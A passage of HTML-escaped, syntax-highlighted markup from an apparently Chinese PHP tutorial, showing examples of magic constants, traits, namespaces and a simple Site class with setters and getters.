&lt;span class=&#34;token function&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;tt&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;gg&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;魔术变量&#34;&gt;&lt;a href=&#34;#魔术变量&#34; class=&#34;headerlink&#34; title=&#34;魔术变量&#34;&gt;&lt;/a&gt;魔术变量&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;这是第 &#34; &#39;&lt;/span&gt;  &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;__LINE__&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39; &#34; 行&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;该文件位于 &#34; &#39;&lt;/span&gt;  &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;__FILE__&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39; &#34; &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;该文件位于 &#34; &#39;&lt;/span&gt;  &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;__DIR__&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39; &#34; &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt;  &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;函数名为：&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;__FUNCTION__&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt;  &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;函数名为：&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;__METHOD__&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name-definition class-name&#34;&gt;test&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;_print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;类名为：&#39;&lt;/span&gt;  &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;__CLASS__&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;br&amp;gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt;  &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;函数名为：&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;__FUNCTION__&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$t&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$t&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;_print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name-definition class-name&#34;&gt;Base&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;sayHello&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;Hello &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;trait&lt;/span&gt; &lt;span class=&#34;token class-name-definition class-name&#34;&gt;SayWorld&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;sayHello&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;token keyword static-context&#34;&gt;parent&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;sayHello&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;World!&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name-definition class-name&#34;&gt;MyHelloWorld&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Base&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;use&lt;/span&gt; &lt;span class=&#34;token package&#34;&gt;SayWorld&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;token variable&#34;&gt;$o&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;MyHelloWorld&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$o&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;sayHello&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;//namespace MyProject;&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;//echo &#39;命名空间为：&#34;&#39;, __NAMESPACE__, &#39;&#34;&#39;; // 输出 &#34;MyProject&#34;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;命名空间&#34;&gt;&lt;a href=&#34;#命名空间&#34; class=&#34;headerlink&#34; title=&#34;命名空间&#34;&gt;&lt;/a&gt;命名空间&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;  
&lt;span class=&#34;token keyword&#34;&gt;namespace&lt;/span&gt; &lt;span class=&#34;token package&#34;&gt;MyProject&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;CONNECT_OK&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name-definition class-name&#34;&gt;Connection&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;/* ... */&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;connect&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;/* ... */&lt;/span&gt;  &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;namespace&lt;/span&gt; &lt;span class=&#34;token package&#34;&gt;AnotherProject&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;CONNECT_OK&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name-definition class-name&#34;&gt;Connection&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;/* ... */&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;connect&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;/* ... */&lt;/span&gt;  &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt; &lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;面向对象&#34;&gt;&lt;a href=&#34;#面向对象&#34; class=&#34;headerlink&#34; title=&#34;面向对象&#34;&gt;&lt;/a&gt;面向对象&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name-definition class-name&#34;&gt;Site&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;token comment&#34;&gt;/* 成员变量 */&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$url&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$title&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$par1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$par2&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;url&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$par1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;title&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$par2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;__destruct&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;销毁 &#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;token comment&#34;&gt;/* 成员函数 */&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;setUrl&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$par&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;url&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$par&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;

    &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;getUrl&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;url&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;PHP_EOL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;

    &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;setTitle&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$par&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;title&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$par&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;

    &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;getTitle&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;title&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;PHP_EOL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;token variable&#34;&gt;$runoob&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Site&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$taobao&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Site&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$google&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Site&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;// 调用成员函数，设置标题和URL&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$runoob&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;setTitle&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;菜鸟教程&#34;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$taobao&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;setTitle&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;淘宝&#34;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$google&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;setTitle&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;Google 搜索&#34;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;token variable&#34;&gt;$runoob&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;setUrl&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;www.runoob.com&#39;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$taobao&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;setUrl&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;www.taobao.com&#39;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
